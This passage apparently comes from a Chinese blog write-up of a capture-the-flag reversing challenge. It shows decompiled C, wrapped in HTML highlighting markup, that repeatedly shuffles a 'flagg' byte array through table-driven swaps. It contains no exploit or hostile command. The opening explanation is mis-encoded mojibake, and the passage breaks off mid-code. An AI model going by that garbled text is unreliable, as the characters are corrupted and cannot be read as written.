å¯†é€»è¾‘ï¼Œæœ‰å–ä½™æœ‰é™¤æœ‰å¼‚æˆ–ï¼Œäºæ˜¯å°±æœ‰ä¸ªéªšæ“ä½œçš„æƒ³æ³•ï¼Œæ—¢ç„¶é€†å‘åŠ å¯†ç®—æ³•æ¯”è¾ƒå¤æ‚ï¼Œå°±æ‰¾å‡º 00-ff çš„æ˜ å°„å°±è¡Œäº† å› ä¸ºæ˜¯æŒ‰ä½åŠ å¯†çš„ä¼ç„¶åå‰é¢çš„å‡ æ¬¡æ‰“ä¹±é¡ºåºç”±äºæ˜¯å›ºå®šçš„è¡¨æ‰€ä»¥å¯ä»¥çœ‹æˆä¸€æ¬¡æ‰“ä¹±é¡ºåº æ‰¾å‡ºç´¢å¼•äº¤æ¢çš„é¡ºåºå³å¯</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token operator\">++</span>v8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token string\">\"/\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    v9 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    v10 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      v11 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v11 <span class=\"token operator\">>=</span> <span class=\"token number\">64</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>v12 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v9 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> flagg<span class=\"token punctuation\">[</span>v9 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v11<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> flagg<span class=\"token punctuation\">[</span>v11<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v12<span class=\"token punctuation\">,</span> v13 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v10<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v10 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>LABEL_53<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        core<span class=\"token operator\">::</span>panicking<span class=\"token operator\">::</span>panic_bounds_check<span class=\"token operator\">::</span><span class=\"token function\">h7d0e683548e4cb10</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      v14 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v9 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v9 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v13<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v13<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v14<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      v10 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      v9 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v9 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_55C3745E9D20<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    v15 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    v16 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      v17 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v16 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v17 <span class=\"token operator\">></span> <span class=\"token number\">63</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      v18 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v15 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v15 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v17<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v17<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v18<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      v19 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v16<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v16 <span class=\"token operator\">></span> <span class=\"token number\">63</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>      v20 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v15 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v15 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v19<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v19<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v20<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>      v16 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      v15 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v15 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_55C3745E9F20<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    v21 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    v22 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>      v23 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v22 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v23 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>      v24 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v21 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v21 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v23<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v23<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v24<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>      v25 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v22<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v22 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>      v26 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v21 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v21 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v25<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v25<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v26<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>      v22 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>      v21 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v21 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_55C3745EA120<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    v27 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    v28 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>      v29 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v28 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v29 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>      v30 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v27 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v27 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v29<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v29<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>      v31 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v28<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v28 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>      v32 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v27 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v27 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v31<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v31<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v32<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>      v28 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>      v27 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v27 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_55C3745EA320<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    v33 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    v34 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>      v35 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v34 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v35 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>      v36 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v33 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v33 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v35<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v35<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v36<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>      v37 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v34<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v34 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>      v38 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v33 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v33 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v37<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v37<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v38<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>      v34 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>      v33 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v33 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_55C3745EA520<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    v39 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>    v40 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>      v41 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v40 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v41 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>      v42 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v39 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v39 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v41<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v41<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v42<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>      v43 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>v40<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v40 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>      v44 <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v39 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v39 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> flagg<span class=\"token punctuation\">[</span>v43<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>      flagg<span class=\"token punctuation\">[</span>v43<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v44<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>      v40 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>      v39 <span class=\"token operator\">-=</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v39 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>unk_55C3745EA720<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    v45 <span class=\"token operator\">=</span> <span class=\"token number\">64LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    v46 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>dest<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>      v47 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v46 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v47 <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_53<span class=\"token 